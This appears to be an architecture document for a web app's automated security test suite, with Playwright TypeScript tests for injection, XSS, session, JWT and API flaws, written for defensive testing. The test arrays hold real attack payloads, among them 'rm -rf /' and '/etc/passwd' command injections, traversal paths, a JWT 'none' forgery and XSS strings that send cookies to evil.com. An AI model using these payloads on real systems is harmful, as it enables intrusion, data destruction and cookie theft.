# Security Testing Framework Architecture

## Overview

This document defines the comprehensive security testing framework for claude-flow-ui, implementing OWASP Top 10 testing, penetration testing automation, and security compliance validation.

## Security Testing Architecture

```mermaid
graph TB
    subgraph "Security Test Categories"
        OWASP[OWASP Top 10<br/>Vulnerability Testing]
        PENTEST[Penetration Testing<br/>Automated Scans]
        COMPLIANCE[Compliance Testing<br/>GDPR, HIPAA, SOC2]
        AUTH[Authentication Testing<br/>Session Security]
        AUTHZ[Authorization Testing<br/>Access Control]
        CRYPTO[Cryptography Testing<br/>Encryption Validation]
    end

    subgraph "Static Analysis"
        SAST[Static Analysis<br/>SonarQube, Snyk]
        DEPS[Dependency Scanning<br/>NPM Audit, Retire.js]
        SECRETS[Secret Scanning<br/>GitLeaks, TruffleHog]
        CODE_QUALITY[Code Quality<br/>Security Hotspots]
    end

    subgraph "Dynamic Analysis"
        DAST[Dynamic Analysis<br/>OWASP ZAP, Burp]
        FUZZING[Fuzzing<br/>Input Validation]
        RUNTIME[Runtime Protection<br/>WAF Testing]
        API_SEC[API Security<br/>REST/GraphQL/WS]
    end

    subgraph "Security Monitoring"
        INTRUSION[Intrusion Detection<br/>Anomaly Detection]
        AUDIT[Audit Logging<br/>Security Events]
        INCIDENT[Incident Response<br/>Breach Simulation]
        FORENSICS[Digital Forensics<br/>Evidence Collection]
    end

    OWASP --> SAST
    PENTEST --> DAST
    COMPLIANCE --> AUDIT
    AUTH --> FUZZING
    AUTHZ --> INTRUSION
    CRYPTO --> INCIDENT

    style OWASP fill:#ffcdd2
    style SAST fill:#c8e6c9
    style DAST fill:#fff3e0
    style INTRUSION fill:#e1f5fe
```



## OWASP Top 10 Testing Framework

### Injection Attack Testing
```typescript
// tests/security/owasp/injection-tests.ts
import { test, expect } from '@playwright/test';
import { SecurityTestSuite } from '../utils/security-test-suite';

export class InjectionTestSuite extends SecurityTestSuite {

  async testSQLInjection() {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1#",
      "') or '1'='1--",
      "') or ('1'='1--",
    ];

    for (const payload of sqlPayloads) {
      await test.step(`SQL Injection: ${payload}`, async () => {
        const response = await this.apiClient.post('/api/auth/login', {
          email: `test${payload}@example.com`,
          password: 'password123'
        });

        // Should not return sensitive data or indicate injection success
        expect(response.status).not.toBe(200);
        expect(response.body).not.toContain('admin');
        expect(response.body).not.toContain('user_id');
        this.logSecurityTest('sql_injection', payload, response.status === 400);
      });
    }
  }

  async testNoSQLInjection() {
    const noSqlPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "sleep(1000)"}',
      '{"$regex": ".*"}',
      '{"$exists": true}',
    ];

    for (const payload of noSqlPayloads) {
      await test.step(`NoSQL Injection: ${payload}`, async () => {
        const response = await this.apiClient.post('/api/search', {
          query: payload
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid query format');
        this.logSecurityTest('nosql_injection', payload, response.status === 400);
      });
    }
  }

  async testCommandInjection() {
    const commandPayloads = [
      '; ls -la',
      '&& cat /etc/passwd',
      '| whoami',
      '`id`',
      '$(id)',
      '; rm -rf /',
      '& net user',
      '|| dir',
    ];

    for (const payload of commandPayloads) {
      await test.step(`Command Injection: ${payload}`, async () => {
        const response = await this.apiClient.post('/api/terminal/execute', {
          command: `echo "test"${payload}`
        });

        // Should sanitize or reject dangerous commands
        expect(response.status).not.toBe(200);
        if (response.status === 200) {
          expect(response.body.output).not.toContain('root:');
          expect(response.body.output).not.toContain('uid=');
        }
        this.logSecurityTest('command_injection', payload, response.status !== 200);
      });
    }
  }

  async testLDAPInjection() {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*))%00',
      '*()|&\'',
      '*()|%26',
      '*)(uid=*))(|(uid=*',
    ];

    for (const payload of ldapPayloads) {
      await test.step(`LDAP Injection: ${payload}`, async () => {
        const response = await this.apiClient.post('/api/directory/search', {
          username: payload
        });

        expect(response.status).toBe(400);
        this.logSecurityTest('ldap_injection', payload, response.status === 400);
      });
    }
  }

  async testXPathInjection() {
    const xpathPayloads = [
      "' or '1'='1",
      "' or ''='",
      "x' or 1=1 or 'x'='y",
      "')]",
    ];

    for (const payload of xpathPayloads) {
      await test.step(`XPath Injection: ${payload}`, async () => {
        const response = await this.apiClient.get(`/api/xml/search?query=${encodeURIComponent(payload)}`);

        expect(response.status).not.toBe(200);
        this.logSecurityTest('xpath_injection', payload, response.status !== 200);
      });
    }
  }
}
```

### Cross-Site Scripting (XSS) Testing
```typescript
// tests/security/owasp/xss-tests.ts
export class XSSTestSuite extends SecurityTestSuite {

  async testReflectedXSS() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src=javascript:alert("XSS")>',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
      '<style>@import"javascript:alert(\'XSS\')"</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    ];

    for (const payload of xssPayloads) {
      await test.step(`Reflected XSS: ${payload}`, async () => {
        const response = await this.page.goto(`/search?q=${encodeURIComponent(payload)}`);

        // Check if payload is properly escaped/sanitized
        const pageContent = await this.page.content();
        expect(pageContent).not.toContain(payload);
        expect(pageContent).not.toContain('<script>');

        // Verify no JavaScript execution
        const dialogPromise = this.page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        await this.page.waitForTimeout(500);
        const dialog = await dialogPromise;
        expect(dialog).toBeNull();

        this.logSecurityTest('reflected_xss', payload, dialog === null);
      });
    }
  }

  async testStoredXSS() {
    const xssPayloads = [
      '<script>document.location="http://evil.com/"+document.cookie</script>',
      '',
      '<svg/onload=fetch("http://evil.com/",{method:"POST",body:document.cookie})>',
    ];

    for (const payload of xssPayloads) {
      await test.step(`Stored XSS: ${payload}`, async () => {
        // Submit malicious content
        await this.apiClient.post('/api/comments', {
          content: payload
        });

        // Navigate to page that displays stored content
        await this.page.goto('/comments');

        // Check if payload is properly escaped
        const pageContent = await this.page.content();
        expect(pageContent).not.toContain('<script>');
        expect(pageContent).not.toContain('onerror=');
        expect(pageContent).not.toContain('onload=');

        // Monitor network requests to detect data exfiltration
        const exfilRequests = [];
        this.page.on('request', request => {
          if (request.url().includes('evil.com')) {
            exfilRequests.push(request);
          }
        });

        await this.page.waitForTimeout(2000);
        expect(exfilRequests).toHaveLength(0);

        this.logSecurityTest('stored_xss', payload, exfilRequests.length === 0);
      });
    }
  }

  async testDOMXSS() {
    await this.page.goto('/');

    const domXssPayloads = [
      'javascript:alert("DOM XSS")',
      '#<script>alert("DOM XSS")</script>',
      '#',
    ];

    for (const payload of domXssPayloads) {
      await test.step(`DOM XSS: ${payload}`, async () => {
        await this.page.evaluate((payload) => {
          window.location.hash = payload;
        }, payload);

        // Check if malicious code executes
        const dialogPromise = this.page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        await this.page.waitForTimeout(500);
        const dialog = await dialogPromise;
        expect(dialog).toBeNull();

        this.logSecurityTest('dom_xss', payload, dialog === null);
      });
    }
  }

  async testContentSecurityPolicy() {
    await test.step('CSP Header Validation', async () => {
      const response = await this.page.goto('/');
      const headers = response.headers();

      expect(headers).toHaveProperty('content-security-policy');
      const csp = headers['content-security-policy'];

      // Validate CSP directives
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("style-src 'self'");
      expect(csp).not.toContain("'unsafe-eval'");
      expect(csp).not.toContain("'unsafe-inline'");

      this.logSecurityTest('csp_validation', csp, true);
    });
  }
}
```

### Authentication and Session Security Testing
```typescript
// tests/security/auth/authentication-security.ts
export class AuthenticationSecurityTestSuite extends SecurityTestSuite {

  async testPasswordStrengthRequirements() {
    const weakPasswords = [
      'password',
      '123456',
      'admin',
      'test',
      'password123',
      'qwerty',
      'letmein',
      'welcome',
    ];

    for (const password of weakPasswords) {
      await test.step(`Weak Password: ${password}`, async () => {
        const response = await this.apiClient.post('/api/auth/register', {
          email: 'test@example.com',
          password: password
        });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Password does not meet requirements');
        this.logSecurityTest('weak_password', password, response.status === 400);
      });
    }
  }

  async testBruteForceProtection() {
    const email = 'test@example.com';
    const attempts = 10;

    await test.step('Brute Force Login Attempts', async () => {
      for (let i = 0; i < attempts; i++) {
        const response = await this.apiClient.post('/api/auth/login', {
          email: email,
          password: `wrongpassword${i}`
        });

        if (i < 5) {
          expect(response.status).toBe(401);
        } else {
          // Should be rate limited after 5 attempts
          expect([429, 423]).toContain(response.status);
        }
      }

      this.logSecurityTest('brute_force_protection', `${attempts} attempts`, true);
    });
  }

  async testSessionManagement() {
    // Test session fixation
    await test.step('Session Fixation', async () => {
      await this.page.goto('/login');

      // Get session ID before login
      const sessionBefore = await this.page.evaluate(() => {
        return document.cookie.match(/session=([^;]+)/)?.[1];
      });

      // Login
      await this.login('test@example.com', 'validpassword123');

      // Get session ID after login
      const sessionAfter = await this.page.evaluate(() => {
        return document.cookie.match(/session=([^;]+)/)?.[1];
      });

      // Session ID should change after login
      expect(sessionAfter).not.toBe(sessionBefore);
      this.logSecurityTest('session_fixation', 'Session ID changes on login', sessionAfter !== sessionBefore);
    });

    // Test session timeout
    await test.step('Session Timeout', async () => {
      await this.login('test@example.com', 'validpassword123');

      // Wait for session timeout (simulate)
      await this.page.evaluate(() => {
        const expiredTime = Date.now() - (30 * 60 * 1000); // 30 minutes ago
        document.cookie = `session_expires=${expiredTime}; path=/`;
      });

      // Try to access protected resource
      const response = await this.apiClient.get('/api/protected');
      expect(response.status).toBe(401);

      this.logSecurityTest('session_timeout', 'Expired session rejected', response.status === 401);
    });

    // Test secure cookie flags
    await test.step('Secure Cookie Flags', async () => {
      await this.login('test@example.com', 'validpassword123');

      const cookies = await this.page.context().cookies();
      const sessionCookie = cookies.find(c => c.name === 'session');

      expect(sessionCookie).toBeDefined();
      expect(sessionCookie.secure).toBe(true);
      expect(sessionCookie.httpOnly).toBe(true);
      expect(sessionCookie.sameSite).toBe('Strict');

      this.logSecurityTest('secure_cookies', 'Cookie security flags', sessionCookie?.secure && sessionCookie?.httpOnly);
    });
  }

  async testJWTSecurityVulnerabilities() {
    // Test JWT algorithm confusion
    await test.step('JWT Algorithm Confusion', async () => {
      const validToken = await this.getValidJWT();
      const header = JSON.parse(atob(validToken.split('.')[0]));

      // Try to change algorithm to 'none'
      header.alg = 'none';
      const maliciousHeader = btoa(JSON.stringify(header));
      const payload = validToken.split('.')[1];
      const maliciousToken = `${maliciousHeader}.${payload}.`;

      const response = await this.apiClient.get('/api/protected', {
        headers: { Authorization: `Bearer ${maliciousToken}` }
      });

      expect(response.status).toBe(401);
      this.logSecurityTest('jwt_algorithm_confusion', 'None algorithm rejected', response.status === 401);
    });

    // Test JWT signature verification
    await test.step('JWT Signature Verification', async () => {
      const validToken = await this.getValidJWT();
      const parts = validToken.split('.');
      const maliciousToken = `${parts[0]}.${parts[1]}.invalidsignature`;

      const response = await this.apiClient.get('/api/protected', {
        headers: { Authorization: `Bearer ${maliciousToken}` }
      });

      expect(response.status).toBe(401);
      this.logSecurityTest('jwt_signature_verification', 'Invalid signature rejected', response.status === 401);
    });
  }
}
```

### API Security Testing
```typescript
// tests/security/api/api-security-tests.ts
export class APISecurityTestSuite extends SecurityTestSuite {

  async testRateLimiting() {
    const endpoints = ['/api/auth/login', '/api/users', '/api/search'];

    for (const endpoint of endpoints) {
      await test.step(`Rate Limiting: ${endpoint}`, async () => {
        const requests = Array.from({ length: 100 }, () =>
          this.apiClient.get(endpoint)
        );

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);

        expect(rateLimitedResponses.length).toBeGreaterThan(0);
        this.logSecurityTest('rate_limiting', endpoint, rateLimitedResponses.length > 0);
      });
    }
  }

  async testInputValidation() {
    const maliciousInputs = [
      { type: 'oversized', value: 'A'.repeat(10000) },
      { type: 'null_byte', value: 'test\x00.txt' },
      { type: 'unicode', value: '../../etc/passwd' },
      { type: 'json_bomb', value: JSON.stringify({ a: 'A'.repeat(1000000) }) },
      { type: 'xml_bomb', value: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]><lolz>&lol;</lolz>' },
    ];

    for (const input of maliciousInputs) {
      await test.step(`Input Validation: ${input.type}`, async () => {
        const response = await this.apiClient.post('/api/data', {
          content: input.value
        });

        expect([400, 413, 422]).toContain(response.status);
        this.logSecurityTest('input_validation', input.type, [400, 413, 422].includes(response.status));
      });
    }
  }

  async testDirectoryTraversal() {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
    ];

    for (const payload of traversalPayloads) {
      await test.step(`Directory Traversal: ${payload}`, async () => {
        const response = await this.apiClient.get(`/api/files/${encodeURIComponent(payload)}`);

        expect(response.status).not.toBe(200);
        if (response.status === 200) {
          expect(response.body).not.toContain('root:');
          expect(response.body).not.toContain('Administrator');
        }

        this.logSecurityTest('directory_traversal', payload, response.status !== 200);
      });
    }
  }

  async testHTTPMethodValidation() {
    const endpoints = ['/api/users', '/api/settings', '/api/admin'];
    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE'];

    for (const endpoint of endpoints) {
      for (const method of methods) {
        await test.step(`HTTP Method: ${method} ${endpoint}`, async () => {
          const response = await this.apiClient.request(method, endpoint);

          if (['TRACE', 'TRACK'].includes(method)) {
            expect(response.status).toBe(405);
          }

          // Check if method is properly restricted
          this.logSecurityTest('http_method_validation', `${method} ${endpoint}`,
            response.status === 405 || response.status < 500);
        });
      }
    }
  }

  async testCORSConfiguration() {
    await test.step('CORS Configuration', async () => {
      const response = await this.apiClient.options('/api/users', {
        headers: {
          'Origin': 'https://malicious.example.com',
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Content-Type'
        }
      });

      const corsHeaders = response.headers();

      // Should not allow all origins
      expect(corsHeaders['access-control-allow-origin']).not.toBe('*');

      // Should not allow dangerous headers
      expect(corsHeaders['access-control-allow-headers']).not.toContain('*');

      this.logSecurityTest('cors_configuration', 'CORS properly restricted',
        corsHeaders['access-control-allow-origin'] !== '*');
    });
  }
}
```

### Security Test Runner and Reporting
```typescript
// tests/security/security-test-runner.ts
export class SecurityTestRunner {
  private results: SecurityTestResult[] = [];
  private vulnerabilities: SecurityVulnerability[] = [];

  async runAllSecurityTests() {
    console.log('🔒 Starting comprehensive security test suite...');

    // Run OWASP Top 10 tests
    await this.runOWASPTests();

    // Run authentication security tests
    await this.runAuthenticationTests();

    // Run API security tests
    await this.runAPISecurityTests();

    // Run infrastructure security tests
    await this.runInfrastructureTests();

    // Generate security report
    await this.generateSecurityReport();
  }

  private async runOWASPTests() {
    const injectionTests = new InjectionTestSuite();
    const xssTests = new XSSTestSuite();

    await injectionTests.runAll();
    await xssTests.runAll();

    this.results.push(...injectionTests.getResults());
    this.results.push(...xssTests.getResults());
  }

  private async generateSecurityReport() {
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        totalTests: this.results.length,
        passed: this.results.filter(r => r.passed).length,
        failed: this.results.filter(r => !r.passed).length,
        vulnerabilities: this.vulnerabilities.length,
        riskScore: this.calculateRiskScore(),
      },
      categories: this.categorizeResults(),
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateRecommendations(),
      compliance: this.checkCompliance(),
    };

    // Save report
    await this.saveReport(report);

    // Send alerts for critical vulnerabilities
    await this.sendSecurityAlerts(report);

    console.log('🛡️ Security test report generated:', JSON.stringify(report.summary, null, 2));
  }

  private calculateRiskScore(): number {
    const weights = {
      critical: 10,
      high: 7,
      medium: 4,
      low: 1,
    };

    let totalRisk = 0;
    for (const vuln of this.vulnerabilities) {
      totalRisk += weights[vuln.severity];
    }

    return Math.min(100, totalRisk);
  }

  private generateRecommendations(): SecurityRecommendation[] {
    const recommendations: SecurityRecommendation[] = [];

    // Analyze failed tests and generate recommendations
    const failedResults = this.results.filter(r => !r.passed);

    for (const result of failedResults) {
      recommendations.push({
        category: result.category,
        priority: this.getPriorityForCategory(result.category),
        description: this.getRecommendationForTest(result.testName),
        remediation: this.getRemediationSteps(result.testName),
        resources: this.getSecurityResources(result.category),
      });
    }

    return recommendations;
  }

  private checkCompliance(): ComplianceReport {
    return {
      owasp: this.checkOWASPCompliance(),
      gdpr: this.checkGDPRCompliance(),
      pci: this.checkPCICompliance(),
      hipaa: this.checkHIPAACompliance(),
    };
  }
}

// Type definitions for security testing
interface SecurityTestResult {
  testName: string;
  category: string;
  passed: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  evidence: any;
  timestamp: string;
}

interface SecurityVulnerability {
  id: string;
  name: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  category: string;
  description: string;
  impact: string;
  remediation: string;
  references: string[];
}

interface SecurityRecommendation {
  category: string;
  priority: number;
  description: string;
  remediation: string[];
  resources: string[];
}
```

This comprehensive security testing framework provides automated testing for common vulnerabilities, authentication flaws, and compliance requirements, ensuring the claude-flow-ui application maintains high security standards.